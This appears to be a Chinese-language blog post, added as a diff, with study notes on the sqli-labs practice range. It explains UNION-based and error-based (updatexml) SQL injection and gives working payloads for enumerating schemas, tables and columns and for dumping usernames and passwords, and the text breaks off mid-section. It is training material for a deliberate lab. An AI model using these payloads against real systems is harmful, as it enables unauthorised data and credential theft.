@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"evi133.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+  <meta property="og:type" content="article">
+<meta property="og:title" content="sqli靶场学习要点总结">
+<meta property="og:url" content="https://evi133.github.io/blogs/sql_injection/index.html">
+<meta property="og:site_name" content="evi133&#39;s blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201085050248.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201085417830.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201085617782.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201090117321.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201090149038.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201090445372.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201092238575.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201094042684.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201094307453.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201094710277.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201104649116.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201104916342.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201105043018.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201105401601.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201120119594.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201120756406.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201121516972.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201121706270.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201121850810.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201122637232.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201124213175.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201124337650.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201124943294.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201130219446.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201131654510.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201132325990.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201133754247.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201135543278.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201145511630.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201151409609.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201151820419.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201153918305.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201160710682.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201160901890.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221203215145633.png">
+<meta property="og:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221203215212251.png">
+<meta property="article:published_time" content="2022-12-03T10:11:51.000Z">
+<meta property="article:modified_time" content="2022-12-03T14:08:55.906Z">
+<meta property="article:author" content="evi133">
+<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://evi133.github.io/images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201085050248.png">
+
+<link rel="canonical" href="https://evi133.github.io/blogs/sql_injection/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sqli靶场学习要点总结 | evi133's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">evi133's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://evi133.github.io/blogs/sql_injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="evi133">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="evi133's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqli靶场学习要点总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-03 18:11:51 / 修改时间：22:08:55" itemprop="dateCreated datePublished" datetime="2022-12-03T18:11:51+08:00">2022-12-03</time>
+            </span>
+
+          
+            <div class="post-description"> </div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="1-项目准备"><a href="#1-项目准备" class="headerlink" title="1.项目准备"></a>1.项目准备</h1><p><strong>项目地址:</strong> <a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
+<p><strong>环境:</strong> apache php5(支持mysql_connect()) mysql5以上(有information_schema系统表)</p>
+<h1 id="2-要点总结"><a href="#2-要点总结" class="headerlink" title="2.要点总结"></a>2.要点总结</h1><h2 id="2-0-前置知识"><a href="#2-0-前置知识" class="headerlink" title="2.0 前置知识"></a>2.0 前置知识</h2><p>MySQL5.0版本以上存在一个重要的系统数据库information_schema,通过此数据库可访问MySQL中存在的数据库名,表明,字段名等元数据</p>
+<ul>
+<li><strong>infromation_schema.columns:</strong><ul>
+<li>table_schema 数据库名</li>
+<li>table_name 表名</li>
+<li>column_name 列名</li>
+</ul>
+</li>
+<li><strong>information_schema.tables:</strong><ul>
+<li>table_schema 数据库名</li>
+<li>table_name 表名</li>
+</ul>
+</li>
+<li><strong>information_schema.schemata:</strong><ul>
+<li>schema_name 数据库名</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-1-常用闭合符号"><a href="#2-1-常用闭合符号" class="headerlink" title="2.1 常用闭合符号"></a>2.1 常用闭合符号</h2><ul>
+<li>‘</li>
+<li>“</li>
+<li>)</li>
+<li>‘)</li>
+<li>“)</li>
+</ul>
+<h2 id="2-2-判断注入常用方法"><a href="#2-2-判断注入常用方法" class="headerlink" title="2.2 判断注入常用方法"></a>2.2 判断注入常用方法</h2><ul>
+<li>使用闭合符号,让SQL语句不能正常闭合,导致页面报错</li>
+<li>构造永真&#x2F;假式,观察返回结果</li>
+<li>如果id&#x3D;9-1与id&#x3D;8返回相同,则证明参数值参与了运算,可能存在注入,同理还可利用加、乘、除</li>
+</ul>
+<h2 id="2-3-注入类型详解"><a href="#2-3-注入类型详解" class="headerlink" title="2.3 注入类型详解"></a>2.3 注入类型详解</h2><p>根据注入技术分类有一下五种:</p>
+<ul>
+<li>联合查询注入</li>
+<li>报错注入</li>
+<li>延时注入</li>
+<li>布尔盲注</li>
+<li>堆叠查询</li>
+</ul>
+<h3 id="2-3-1-联合查询注入"><a href="#2-3-1-联合查询注入" class="headerlink" title="2.3.1 联合查询注入"></a>2.3.1 联合查询注入</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>这种注入就是union注入,在MySQL中union为连接两条SQL语句并执行,前提为两边的输入应为相同的列数,如果数据类型不同的话,MySQL会进行隐式转换;同时,列的名称由第一个查询的列的名称决定,所以在进行联合查询前,应提前判断列数,判断列数时,可以使用order by。</p>
+<p>在MySQL中,order by代表排序,有如图所示的一张表</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201085050248.png" alt="image-20221201085050248"></p>
+<p>可以利用order by 进行排序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tb_user order by n;</span><br></pre></td></tr></table></figure>
+
+<p>n可以为数字,也可以为字段,n为数字时,代表表中的第n个字段,即下面两个查询结果一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from tb_user order by password;</span><br><span class="line">select * from tb_user order by 3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201085417830.png" alt="image-20221201085417830"></p>
+<p>如果数字超出字段数,即会报错</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201085617782.png" alt="image-20221201085617782"></p>
+<p>我们即可利用这个特征进行字段数的判断,然后用union进行注入</p>
+<p>union用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table1 union select * from table2;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201090117321.png" alt="image-20221201090117321"></p>
+<p>如果列数不同即会报错</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201090149038.png" alt="image-20221201090149038"></p>
+<h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>正常访问</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201090445372.png" alt="image-20221201090445372"></p>
+<p>判断是否存在注入,加一个单引号</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201092238575.png" alt="image-20221201092238575"></p>
+<p>根据报错信息,可以得到SQL语句直接拼接的参数值,且为单引号闭合</p>
+<p>SQL语句大概为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id = &#x27;1&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; order by n --+</span><br></pre></td></tr></table></figure>
+
+<p>当n&#x3D;3时正常,当n&#x3D;4是报错,所以列数为3</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201094042684.png" alt="image-20221201094042684"></p>
+<h5 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201094307453.png" alt="image-20221201094307453"></p>
+<p>页面没有发生改变,因为这个查询会查询出两行结果,但是这个php文件中只返回一行结果,所以应构造出union左边无结果,可以将id改为-1或者一个极大值,最后url应该为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.59.137:8715/sqli/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201094710277.png" alt="image-20221201094710277"></p>
+<p>2,3即为显示位,可以在2,3的地方替换成我们想要查询的句子,结果会返回到2,3的位置</p>
+<h5 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h5><p>**group_concat():**函数返回一个字符串结果,该结果由分组中的值连接组合而成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201104649116.png" alt="image-20221201104649116"></p>
+<h5 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201104916342.png" alt="image-20221201104916342"></p>
+<h5 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201105043018.png" alt="image-20221201105043018"></p>
+<h5 id="获取列中的数据"><a href="#获取列中的数据" class="headerlink" title="获取列中的数据"></a>获取列中的数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,(select group_concat(id,&#x27;-&#x27;,username,&#x27;-&#x27;,password) from users) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201105401601.png" alt="image-20221201105401601"></p>
+<h3 id="2-3-2-报错注入"><a href="#2-3-2-报错注入" class="headerlink" title="2.3.2 报错注入"></a>2.3.2 报错注入</h3><h4 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h4><p>在MySQL中,报错注入就是指通过页面报出的错误信息,构造合适的语句来获取想要的数据,应用系统没有处理SQL语句错误直接回显到页面上时,即可使用报错注入,报错注入常用的函数是updatexml()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(XML_document,XPath_string,new_value)</span><br></pre></td></tr></table></figure>
+
+<p>**XML_document:**String格式,为XML文档对象的名称</p>
+<p>**XPath_string:**XPath格式的字符串</p>
+<p>**new_value:**String格式,替换查找到符合条件的数据</p>
+<p>报错注入基本语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x7e</strong>表示的是**~<strong>符号,这个符号在XPath语法中是不存在的,因此可以报错,同理,其他在XPath语法中不存在的也可以造成报错,例如</strong>!<strong>在16进制中为</strong>0x21**</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201120119594.png" alt="image-20221201120119594"></p>
+<h4 id="注入方法-1"><a href="#注入方法-1" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>加单引号,报错,但是没有显示位,所以可以选择报错注入</p>
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201120756406.png" alt="image-20221201120756406"></p>
+<p>SQL语句为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id = &#x27;1&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>
+
+<h5 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201121516972.png" alt="image-20221201121516972"></p>
+<h5 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201121706270.png" alt="image-20221201121706270"></p>
+<h5 id="获取列名-1"><a href="#获取列名-1" class="headerlink" title="获取列名"></a>获取列名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201121850810.png" alt="image-20221201121850810"></p>
+<h5 id="获取列中的数据-1"><a href="#获取列中的数据-1" class="headerlink" title="获取列中的数据"></a>获取列中的数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,&#x27;-&#x27;,username,&#x27;-&#x27;,password) from users),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201122637232.png" alt="image-20221201122637232"></p>
+<p>此时数据并没有完全爆出,因为一次只能爆出32个字符,这里字符大于32,需要使用到substring()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substring(string,position,length)</span><br></pre></td></tr></table></figure>
+
+<p>**string:**指需要截取的原字符串</p>
+<p>**position:**指从哪个位置开始截取字符串,从1开始,为负数时从右往左数</p>
+<p>**length:**指需要截取的长度</p>
+<p>所以我们的句子可以改成这样</p>
